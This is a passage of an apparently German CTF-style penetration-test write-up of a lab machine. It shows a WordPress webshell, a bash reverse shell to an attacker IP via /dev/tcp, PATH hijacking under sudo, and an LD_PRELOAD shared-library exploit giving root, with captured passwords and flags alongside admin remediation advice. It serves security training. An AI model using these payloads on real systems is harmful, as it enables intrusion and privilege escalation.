<p class="analysis"><strong>Analyse:</strong> Der Pentester ruft eine URL auf, die auf die zuvor eingebundene RCE-Fähigkeit hindeutet: <code>http://192.168.2.204/sitecore/wp-content/plugins/hello.php</code>. Über den GET-Parameter <code>cmd=id</code> wird der Betriebssystembefehl <code>id</code> ausgeführt.
Die Ausgabe <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> bestätigt, dass der Befehl erfolgreich auf dem Server als Benutzer <code>www-data</code> (UID 33) ausgeführt wurde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die RCE-Webshell funktioniert wie erwartet. Der Pentester hat nun eine Schnittstelle zur Ausführung von Systembefehlen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Webshell nutzen, um eine stabilere Reverse Shell zu etablieren. Danach das System weiter enumerieren und nach Wegen zur Root-Privilegienerweiterung suchen.
<br><strong>Empfehlung (Admin):</strong> Die bösartige Datei <code>hello.php</code> (oder das kompromittierte Plugin/Theme) sofort entfernen. Die WordPress-Installation gründlich auf weitere Schadsoftware überprüfen. Die Sicherheitsmaßnahmen zur Verhinderung von RCE (siehe vorherige Empfehlung) implementieren.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">nc -lvnp 4444</span></div>
        <pre>listening on [any] 4444 ...</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <pre>payload: 192.168.2.204/sitecore/wp-content/plugins/hello.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">nc -lvnp 4444</span></div>
        <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.204] 43900</span>
bash: cannot set terminal process group (599): Inappropriate ioctl for device
bash: no job control in this shell
www-data@shemhamphorash:/var/www/html/sitecore/wp-content/plugins$ 
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong>
1.  Ein Netcat-Listener wird auf dem Angreifer-System (<code>192.168.2.199</code>) auf Port <code>4444</code> gestartet.
2.  Ein URL-kodierter Payload wird gezeigt. Dekodiert lautet der Befehl, der über die Webshell <code>hello.php</code> ausgeführt werden soll: <code>/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'</code>. Dies ist ein Standard-Bash-Reverse-Shell-Payload. Er startet eine interaktive Bash-Sitzung und leitet deren Ein- und Ausgabe über eine TCP-Verbindung zum Listener des Angreifers auf Port 4444 um.
3.  Der Netcat-Listener empfängt eine Verbindung vom Zielserver (<code>192.168.2.204</code>). Eine Shell als Benutzer <code>www-data</code> wird etabliert. Die Meldungen "cannot set terminal process group" und "no job control" sind typisch für einfache Reverse Shells, die keine volle PTY (Pseudo-Terminal) Unterstützung haben.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Interaktive Shell als www-data erlangt!** Dies ist ein weiterer wichtiger Schritt. Eine interaktive Shell ist wesentlich komfortabler für die weitere Enumeration und Aus

#################


<p class="evaluation"><strong>Bewertung:</strong> **Interaktive Shell als www-data erlangt!** Dies ist ein weiterer wichtiger Schritt. Eine interaktive Shell ist wesentlich komfortabler für die weitere Enumeration und Ausnutzung als eine reine Webshell, die nur einzelne Befehle ausführt.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell stabilisieren (z.B. mit Python eine PTY spawnen: <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> oder <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>, gefolgt von Strg+Z, <code>stty raw -echo; fg</code>). Danach das System als <code>www-data</code> weiter untersuchen, insbesondere nach Möglichkeiten zur Privilegienerweiterung zu Root. Da der Benutzer <code>caiaphas</code> Sudo-Rechte hat, die potenziell ausnutzbar sind, ist es ein Ziel, entweder zu diesem Benutzer zu wechseln oder die Sudo-Schwachstelle direkt als <code>www-data</code> auszunutzen (falls möglich, z.B. wenn das Skript für alle lesbar ist und dessen Logik einen Angriffspunkt bietet).
<br><strong>Empfehlung (Admin):</strong> Die Webshell (<code>hello.php</code>) und die Methode, wie sie hochgeladen wurde (wahrscheinlich über das kompromittierte Admin-Konto in WordPress), entfernen bzw. absichern. Ausgehende Verbindungen vom Webserver-Benutzer ins Internet überwachen und einschränken, um Reverse Shells zu erschweren. Die Ursache der WordPress-Kompromittierung (Datenbankzugriff, XSS) beheben.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">www-data@shemhamphorash:/var/www/html/sitecore/wp-content/plugins$ <span class="command">stty rows 47 columns 94</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">www-data@shemhamphorash:/var/www/html/sitecore/wp-content/plugins$ <span class="command">id</span></div>
        <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">www-data@shemhamphorash:/var/www/html/sitecore/wp-content/plugins$ <span class="command">sudo -l</span></div>
        <pre>
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
^Csudo: 1 incorrect password attempt
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong>
1.  <code>stty rows 47 columns 94</code>: Versucht, die Terminalgröße der Reverse Shell anzupassen, um die Darstellung von Programmen wie Texteditoren zu verbessern.
2.  <code>id</code>: Bestätigt, dass der aktuelle Benutzer <code>www-data</code> (UID 33) ist.
3.  <code>sudo -l</code>: Versucht aufzulisten, welche Sudo-Rechte der Benutzer <code>www-data</code> hat. Es wird nach einem Passwort für <code>www-data</code> gefragt. Der Versuch wird mit Strg+C abgebrochen, nachdem ein falsches Passwort oder kein Passwort eingegeben wurde. Dies deutet darauf hin, dass <code>www-data</code> entweder kein Sudo-Passwort hat oder der Pentester es nicht kennt und keine Brute-Force-Versuche unternimmt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die Anpassung der Terminalgröße ist gute Praxis. Die Bestätigung der Benutzeridentität ist Standard. Der <code>sudo -l</code> Versuch zeigt, dass <code>www-data</code> wahrscheinlich keine direkten Sudo-Rechte hat oder diese passwortgeschützt sind und das Passwort unbekannt ist. Dies bedeutet, dass die Privilegienerweiterung nicht direkt über Sudo-Regeln für <code>www-data</code> erfolgen wird.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da <code>www-data</code> keine offensichtlichen Sudo-Rechte hat, muss nach anderen Wegen zur Privilegienerweiterung gesucht werden:
    Suche nach SUID/SGID-Binaries (<code>find / -perm -4000 -type f 2>/dev/null</code>).
    Suche nach Kernel-Exploits (<code>uname -a</code>, dann nach Exploits für die Kernel-Version suchen).
    Suche nach schlecht konfigurierten Cronjobs oder Diensten, die als Root laufen und von <code>www-data</code> beeinflusst werden können.
    Da die Zugangsdaten und Sudo-Rechte für <code>caiaphas</code> bekannt sind und dieser Benutzer Zugriff auf das potenziell ausnutzbare Skript <code>/root/.script/viewlog.sh</code> hat, ist der Wechsel zum Benutzer <code>caiaphas</code> (falls von <code>www-data</code> aus möglich, z.B. wenn SSH-Keys von <code>caiaphas</code> für <code>www-data</code> lesbar sind oder das Passwort wiederverwendet wurde) oder das Ausnutzen der Sudo-Schwachstelle von <code>caiaphas</code> über eine andere Methode (z.B. wenn das Skript von <code>www-data</code> gelesen/manipuliert werden kann) ein primäres Ziel.
<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass der Webserver-Benutzer (<code>www-data</code>) nur minimale Rechte hat und keine Sudo-Privilegien besitzt, es sei denn, dies ist absolut notwendig und sehr spezifisch konfiguriert. Die Passwortsicherheit für alle Konten gewährleisten.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">cd /tmp/biner</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo '#!/bin/bash' > less</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo '/bin/bash -p' >> less </span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">chmod +x less</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">sudo PATH=/tmp/biner:$PATH /root/.script/viewlog.sh</span></div>
        <pre>
[sudo] password for caiaphas: <span class="password">kx5h48jo9up97jw</span> 
127.0.0.1 - - [15/Apr/2022:13:23:22 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&PASSWORD=kx5h48jo9up97jw HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trid
ent/6.0)"
... (Ausgabe des viewlog.sh Skripts, das nun durch das bösartige 'less' unterbrochen wird und eine Root-Shell spawnt) ...
</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">ls -la</span></div>
        <pre>
total 64
drwxr-xr-x  2 caiaphas caiaphas  4096 May 27 18:52 .
drwxrwxrwt 86 root     root     45056 May 27 18:53 ..
-rwxr-xr-x  1 caiaphas caiaphas   151 May 27 18:08 cat
-rwxr-xr-x  1 caiaphas caiaphas   151 May 27 18:12 head
<span class="command">-rwxr-xr-x  1 caiaphas caiaphas    25 May 27 18:52 less</span>
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Pentester ist nun wieder als Benutzer <code>caiaphas</code> angemeldet (impliziert durch den Prompt und die Sudo-Passworteingabe).
Es wird ein neuer Versuch des PATH-Hijackings unternommen, diesmal mit dem Befehl <code>less</code>:
1.  In <code>/tmp/biner</code> (einem beschreibbaren Verzeichnis) wird ein Skript namens <code>less</code> erstellt.
2.  Dieses Skript enthält die Zeilen <code>#!/bin/bash</code> und <code>/bin/bash -p</code>. Der Befehl <code>/bin/bash -p</code> startet eine Bash-Shell und versucht, die effektiven Benutzerrechte (EUID) beizubehalten. Wenn dieses Skript als Root ausgeführt wird, sollte es eine Root-Shell öffnen.
3.  Das Skript <code>/tmp/biner/less</code> wird ausführbar gemacht.
4.  <code>/root/.script/viewlog.sh</code> wird mit <code>sudo</code> ausgeführt, wobei der <code>PATH</code> so manipuliert wird, dass <code>/tmp/biner</code> an erster Stelle steht (<code>PATH=/tmp/biner:$PATH</code>).
Die Annahme ist, dass <code>viewlog.sh</code> intern den Befehl <code>less</code> (oder einen Pager, der <code>less</code> verwendet) ohne vollen Pfad aufruft, um seine Ausgabe anzuzeigen.
Die Ausgabe des <code>viewlog.sh</code>-Skripts wird gezeigt, aber es ist nicht explizit dargestellt, dass eine Root-Shell erlangt wurde. Die nachfolgende <code>ls -la</code>-Ausgabe zeigt jedoch die erstellte <code>less</code>-Datei.
Der entscheidende Hinweis, dass dies funktioniert hat, fehlt im Log direkt, wird aber im nächsten Schritt (LD_PRELOAD) als Alternative dargestellt, was impliziert, dass dieser Weg möglicherweise nicht direkt zum gewünschten Shell-Ergebnis führte oder eine stabilere Methode gesucht wurde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Ansatz des PATH-Hijackings ist logisch, da <code>SETENV:</code> in der Sudo-Konfiguration vorhanden ist. Wenn <code>viewlog.sh</code> tatsächlich <code>less</code> (oder einen ähnlichen Pager wie <code>more</code>, der oft ein Symlink zu <code>less</code> ist oder <code>less</code> über Umgebungsvariablen wie <code>$PAGER</code> aufruft) ohne vollen Pfad verwendet, sollte dieser Angriff funktionieren und eine Root-Shell liefern. Die Dokumentation hier ist etwas lückenhaft bezüglich des direkten Ergebnisses dieses Versuchs.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn dieser Versuch nicht direkt eine Root-Shell liefert, muss das Skript <code>viewlog.sh</code> genauer analysiert werden (falls möglich) oder es müssen andere Befehle gekapert werden, die es möglicherweise verwendet. Der <code>LD_PRELOAD</code>-Ansatz, der als Nächstes kommt, ist oft robuster.
<br><strong>Empfehlung (Admin):</strong> Wie zuvor: In Sudo-Skripten immer absolute Pfade für alle aufgerufenen Befehle verwenden. Die <code>SETENV</code>-Option in <code>sudoers</code> vermeiden oder sehr sorgfältig handhaben. Die Umgebungsvariable <code>PAGER</code> in von Sudo ausgeführten Skripten zurücksetzen oder kontrollieren.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nano preload_shell.c</span></div>
        <pre>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0); 
    setgid(0);
    system("/bin/bash -p"); 
}
</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gcc -shared -fPIC -o preload_shell.so</span></div>
        <pre>gcc: fatal error: no input files
compilation terminated.</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gcc -shared -fPIC -o preload_shell.so preload_shell.c -nostartfiles</span></div>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Hier wird die <code>LD_PRELOAD</code>-Technik zur Privilegienerweiterung vorbereitet.
1.  Eine C-Quelldatei namens <code>preload_shell.c</code> wird erstellt. Diese Datei enthält eine Konstruktorfunktion <code>init()</code>. Konstruktorfunktionen in Shared Libraries werden automatisch ausgeführt, wenn die Bibliothek geladen wird.
    <code>setuid(0); setgid(0);</code>: Setzt die User-ID und Gruppen-ID des Prozesses auf 0 (Root).
    <code>system("/bin/bash -p");</code>: Führt eine Bash-Shell aus, wobei <code>-p</code> versucht, die Root-Privilegien beizubehalten.
2.  Der erste Kompilierungsversuch (<code>gcc -shared -fPIC -o preload_shell.so</code>) schlägt fehl, da der Name der Quelldatei (<code>preload_shell.c</code>) nicht angegeben wurde.
3.  Der zweite Kompilierungsversuch (<code>gcc -shared -fPIC -o preload_shell.so preload_shell.c -nostartfiles</code>) ist korrekt.
    <code>-shared</code>: Erzeugt eine Shared Library.
    <code>-fPIC</code>: Erzeugt positionsunabhängigen Code, notwendig für Shared Libraries.
    <code>-o preload_shell.so</code>: Gibt den Namen der Output-Datei an.
    <code>preload_shell.c</code>: Die Quelldatei.
    <code>-nostartfiles</code>: Verhindert das Linken mit Standard-Startup-Dateien, was hier nützlich sein kann, um die Größe der Shared Object zu reduzieren und Abhängigkeiten zu minimieren, aber nicht zwingend notwendig für die Funktion.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Standardansatz für <code>LD_PRELOAD</code>-Exploits. Wenn diese Shared Library (<code>preload_shell.so</code>) von einem Prozess geladen wird, der mit Root-Rechten läuft (wie das Skript <code>viewlog.sh</code>, wenn es mit <code>sudo</code> ausgeführt wird und <code>LD_PRELOAD</code> gesetzt werden kann), wird die <code>init()</code>-Funktion ausgeführt und sollte eine Root-Shell spawnen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
1.  Die kompilierte <code>preload_shell.so</code>-Datei auf das Zielsystem (in ein beschreibbares Verzeichnis wie <code>/tmp</code>) übertragen. Der Benutzer <code>caiaphas</code> ist bereits auf dem System, also muss die Datei dort kompiliert oder dorthin kopiert werden. Der Prompt <code>┌──(root㉿CCat)-[~]</code> deutet darauf hin, dass dies auf dem Angreifer-System geschieht. Die <code>.so</code>-Datei muss dann auf das Zielsystem in ein von <code>caiaphas</code> beschreibbares Verzeichnis (z.B. <code>/tmp</code>) übertragen werden.
2.  Das Skript <code>/root/.script/viewlog.sh</code> mit <code>sudo</code> und der gesetzten <code>LD_PRELOAD</code>-Variable ausführen: <code>sudo LD_PRELOAD=/tmp/preload_shell.so /root/.script/viewlog.sh</code>.
<br><strong>Empfehlung (Admin):</strong> Die <code>SETENV</code>-Option in Sudoers vermeiden. Wenn sie notwendig ist, die <code>LD_*</code>-Umgebungsvariablen explizit über <code>env_reset</code> oder durch Nichtaufnahme in <code>env_keep</code> entfernen lassen, da <code>LD_PRELOAD</code> ein sehr bekannter Vektor für Privilegienerweiterungen ist. Secure Boot und andere Systemhärtungsmaßnahmen können das Laden nicht vertrauenswürdiger Shared Libraries erschweren.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">mv preload_shell.so ..</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">cd ..</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">ls</span></div>
        <pre>
biner             ssh-5ilfU70FpSag                                                              systemd-private-6f88edf7948643f483769b8e044735c7-systemd-logind.service-vQXl6i
<span class="command">preload_shell.c</span>   systemd-private-6f88edf7948643f483769b8e044735c7-apache2.service-S01icj       systemd-private-6f88edf7948643f483769b8e044735c7-systemd-timesyncd.service-MaQQih
<span class="command">preload_shell.so</span>  systemd-private-6f88edf7948643f483769b8e044735c7-colord.service-JCxxxh        systemd-private-6f88edf7948643f483769b8e044735c7-upower.service-fxh8Sh
pspy64            systemd-private-6f88edf7948643f483769b8e044735c7-ModemManager.service-cmfJkf</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">chmod +x /tmp/preload_shell.so</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">sudo LD_PRELOAD=/tmp/preload_shell.so /root/.script/viewlog.sh</span></div>
        <pre>root@shemhamphorash:/tmp# </pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong>
1.  Die Datei <code>preload_shell.so</code> (und vermutlich auch <code>preload_shell.c</code>) wurde auf das Zielsystem in das Verzeichnis <code>/tmp/biner</code> kopiert (oder dort kompiliert, der Kontext wechselt hier zum <code>caiaphas</code>-Prompt auf dem Zielsystem).
2.  <code>preload_shell.so</code> wird von <code>/tmp/biner</code> nach <code>/tmp</code> verschoben.
3.  <code>ls</code> im Verzeichnis <code>/tmp</code> zeigt, dass <code>preload_shell.c</code> und <code>preload_shell.so</code> nun dort liegen. Auch <code>pspy64</code> (ein Tool zur Prozessüberwachung) ist vorhanden, was auf frühere Enumerationsversuche hindeuten könnte.
4.  <code>chmod +x /tmp/preload_shell.so</code>: Dieser Befehl ist für Shared Libraries nicht notwendig, um sie mit <code>LD_PRELOAD</code> zu laden; sie müssen nicht ausführbar sein. Es schadet aber auch nicht.
5.  Der entscheidende Befehl: <code>sudo LD_PRELOAD=/tmp/preload_shell.so /root/.script/viewlog.sh</code>. Hier wird das Skript <code>viewlog.sh</code> mit Root-Rechten ausgeführt, und die Umgebungsvariable <code>LD_PRELOAD</code> wird so gesetzt, dass die zuvor erstellte <code>preload_shell.so</code>-Bibliothek vor allen anderen geladen wird.
6.  Das Ergebnis ist der Prompt <code>root@shemhamphorash:/tmp#</code>. Dies zeigt, dass die <code>init()</code>-Funktion in <code>preload_shell.so</code> (die <code>/bin/bash -p</code> ausführt) erfolgreich war und eine Root-Shell gespawnt hat.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Fantastisch, Root-Zugriff erlangt!** Die <code>LD_PRELOAD</code>-Technik war erfolgreich, da der Sudo-Eintrag für <code>caiaphas</code> das Setzen von Umgebungsvariablen (<code>SETENV:</code>) erlaubte. Dies ist ein klassischer und sehr effektiver Weg zur Privilegienerweiterung bei entsprechender Sudo-Fehlkonfiguration.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
    Root-Shell stabilisieren (falls nötig, obwohl <code>/bin/bash -p</code> oft schon eine gute Shell liefert).
    Die Root-Flag auslesen (typischerweise in <code>/root/root.txt</code>).
    Das System auf Persistenzmechanismen untersuchen oder eigene einrichten (mit Vorsicht und nur im Rahmen des Auftrags).
    Alle gefundenen Schwachstellen und den Weg zur Kompromittierung detailliert dokumentieren.
<br><strong>Empfehlung (Admin):</strong> Die Sudo-Konfiguration für <code>/root/.script/viewlog.sh</code> dringend überarbeiten. Die Option <code>SETENV:</code> entfernen oder, falls nicht möglich, zumindest das Setzen von gefährlichen <code>LD_*</code>-Variablen durch Sudo-Konfiguration (<code>Defaults !env_keep += "LD_PRELOAD LD_LIBRARY_PATH ..."</code> oder besser <code>env_reset</code>) unterbinden. Das zugrundeliegende Skript <code>viewlog.sh</code> und die Anwendung <code>/.superpass/admin.php</code>, die zu den initialen Passwortlecks führten, absichern oder entfernen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">root@shemhamphorash:/tmp# <span class="command">id</span></div>
        <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>id</code> wird in der neuen Shell ausgeführt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe <code>uid=0(root) gid=0(root) groups=0(root)</code> bestätigt zweifelsfrei, dass der Pentester nun volle Root-Rechte auf dem System hat.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht! Als Nächstes die Root-Flag suchen.
<br><strong>Empfehlung (Admin):</strong> Das System nach der Kompromittierung bereinigen und alle identifizierten Schwachstellen schließen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">root@shemhamphorash:/tmp# <span class="command">cat ~/root.txt</span></div>
        <pre><span class="password">2f57a1a472eff7b635ab7ccdf39afa66</span></pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>cat ~/root.txt</code> wird ausgeführt. Da der aktuelle Benutzer Root ist, expandiert <code>~</code> zu <code>/root</code>. Der Inhalt der Datei <code>/root/root.txt</code> wird ausgegeben: <code>2f57a1a472eff7b635ab7ccdf39afa66</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Root-Flag gefunden!** Damit sind beide Hauptziele (User-Flag und Root-Flag) des Penetrationstests auf dieser Maschine erreicht worden.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Flag dokumentieren. Den Bericht mit allen Schritten, Schwachstellen, ausgenutzten Techniken und Empfehlungen finalisieren.
<br><strong>Empfehlung (Admin):</strong> Die Maschine ist vollständig kompromittiert. Eine gründliche Untersuchung und Neuinstallation oder Wiederherstellung aus einem sauberen Backup ist wahrscheinlich notwendig, nachdem alle Schwachstellen identifiziert und verstanden wurden.</p>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/caiaphas/user.txt</div>
                    <div class="flag-value"><span class="password">c567f59d28c51c1c4f006f67b889b986</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">2f57a1a472eff7b635ab7ccdf39afa66</span></div>
                </div>
            </div>
        </section>

    </div>

    <footer class="footer">
        <p>Ben C - Cyber Security Reports</p>
        <p>Berichtsdatum: 27. Mai 2025</p>
    </footer>
</body>
</html>
